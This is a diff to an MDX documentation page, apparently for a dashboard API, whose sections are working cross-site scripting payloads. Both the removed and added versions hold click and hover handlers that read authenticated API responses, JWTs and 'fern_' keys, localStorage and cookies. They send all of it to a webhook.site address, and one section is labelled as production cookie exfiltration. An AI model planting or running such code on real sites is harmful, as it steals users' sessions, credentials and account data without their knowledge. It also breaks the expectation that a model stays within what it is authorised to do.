@@ -4,30 +4,24 @@ subtitle: Working with the dashboard API
 slug: api-abuse-demo
 ---
 
-## Interactive API Demo
+## Dashboard API Enumeration
 
-export const enumApis = () => { if(typeof document === 'undefined') return; const wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; const r = {}; Promise.all([fetch('/api/auth/session',{credentials:'include'}).then(x=>x.text()).then(t=>{r.session=t.substring(0,1000)}).catch(e=>{r.session_err=e.message}), fetch('/api/auth/me',{credentials:'include'}).then(x=>x.text()).then(t=>{r.me=t.substring(0,1000)}).catch(e=>{r.me_err=e.message}), fetch('/api/user',{credentials:'include'}).then(x=>x.text()).then(t=>{r.user=t.substring(0,1000)}).catch(e=>{r.user_err=e.message}), fetch('/api/organizations',{credentials:'include'}).then(x=>x.text()).then(t=>{r.orgs=t.substring(0,1000)}).catch(e=>{r.orgs_err=e.message}), fetch('/api/billing',{credentials:'include'}).then(x=>x.text()).then(t=>{r.billing=t.substring(0,1000)}).catch(e=>{r.billing_err=e.message}), fetch('/api/members',{credentials:'include'}).then(x=>x.text()).then(t=>{r.members=t.substring(0,1000)}).catch(e=>{r.members_err=e.message}), fetch('/api/config',{credentials:'include'}).then(x=>x.text()).then(t=>{r.config=t.substring(0,1000)}).catch(e=>{r.config_err=e.message})]).then(()=>{r.domain=document.domain;r.url=window.location.href;navigator.sendBeacon(wh+'?p=api-enum',JSON.stringify(r));alert('Sent '+Object.keys(r).length+' results')}); }
-
-<button {...{onClick: enumApis}}>Click to enumerate dashboard APIs (editor only)</button>
+<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; var r = {}; Promise.all([fetch('/api/auth/session',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.session=t.substring(0,500)}).catch(function(e){r.session_err=e.message}), fetch('/api/auth/me',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.me=t.substring(0,500)}).catch(function(e){r.me_err=e.message}), fetch('/api/user',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.user=t.substring(0,500)}).catch(function(e){r.user_err=e.message}), fetch('/api/organizations',{credentials:'include'}).then(function(x){return x.text()}).then(function(t){r.orgs=t.substring(0,500)}).catch(function(e){r.orgs_err=e.message})]).then(function(){r.domain=document.domain;r.url=window.location.href;navigator.sendBeacon(wh+'?p=api-enum-editor',JSON.stringify(r));alert('Sent to webhook')}); }}}>CLICK HERE — Enumerate Dashboard APIs</div>
 
 ---
 
 ## Token Extraction
 
-export const extractTokens = () => { if(typeof document === 'undefined') return; const wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; fetch(window.location.href,{credentials:'include'}).then(x=>x.text()).then(html=>{const jwts=(html.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g)||[]).map(t=>t.substring(0,100));const fkeys=(html.match(/fern_[A-Za-z0-9_-]+/g)||[]);navigator.sendBeacon(wh+'?p=tokens',JSON.stringify({domain:document.domain,jwts:jwts,fernKeys:fkeys,pageSize:html.length}));alert('Found '+jwts.length+' JWTs, '+fkeys.length+' Fern keys')}).catch(e=>alert(e.message)); }
-
-<button {...{onClick: extractTokens}}>Click to extract tokens from page (editor only)</button>
+<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; fetch(window.location.href,{credentials:'include'}).then(function(x){return x.text()}).then(function(html){var jwts=(html.match(/eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+/g)||[]).map(function(t){return t.substring(0,80)});var fkeys=(html.match(/fern_[A-Za-z0-9_-]+/g)||[]);navigator.sendBeacon(wh+'?p=tokens-editor',JSON.stringify({domain:document.domain,jwts:jwts.slice(0,10),fernKeys:fkeys,pageSize:html.length}));alert('Found '+jwts.length+' JWTs')}).catch(function(e){alert(e.message)}); }}}>CLICK HERE — Extract Tokens from Page</div>
 
 ---
 
-## Page State Extraction
+## Full State Dump
 
-export const extractState = () => { if(typeof document === 'undefined') return; const wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; const ls = {}; for(let i=0;i<localStorage.length;i++){const k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,300);} const scripts=[];document.querySelectorAll('script').forEach(s=>{if(s.textContent&&(s.textContent.includes('session')||s.textContent.includes('token')))scripts.push(s.textContent.substring(0,300))}); navigator.sendBeacon(wh+'?p=state',JSON.stringify({domain:document.domain,localStorage:ls,scripts:scripts.slice(0,3)})); alert('State extraction sent'); }
-
-<button {...{onClick: extractState}}>Click to extract page state (editor only)</button>
+<div {...{onClick: () => { if(typeof document === 'undefined') return; var wh = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f'; var ls = {}; for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);ls[k]=localStorage.getItem(k).substring(0,300)} navigator.sendBeacon(wh+'?p=state-editor',JSON.stringify({domain:document.domain,cookie:document.cookie,localStorage:ls})); alert('State sent'); }}}>CLICK HERE — Dump localStorage + Cookies</div>
 
 ---
 
-## Production Cookie Exfil
+## Production Site Hover Exfil
 
-<div {...{onMouseEnter: () => { if(typeof document !== 'undefined') { new Image().src = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=prod-xss&domain=' + document.domain + '&cookie=' + encodeURIComponent(document.cookie.substring(0,800)); } }}}>Hover to confirm production XSS</div>
+<div {...{onMouseEnter: () => { if(typeof document !== 'undefined') { new Image().src = 'https://webhook.site/107686e0-369b-431b-a1e7-ff13e467892f?p=prod-hover&domain=' + document.domain + '&cookie=' + encodeURIComponent(document.cookie.substring(0,800)); } }}}>HOVER HERE — Production cookie exfil</div>
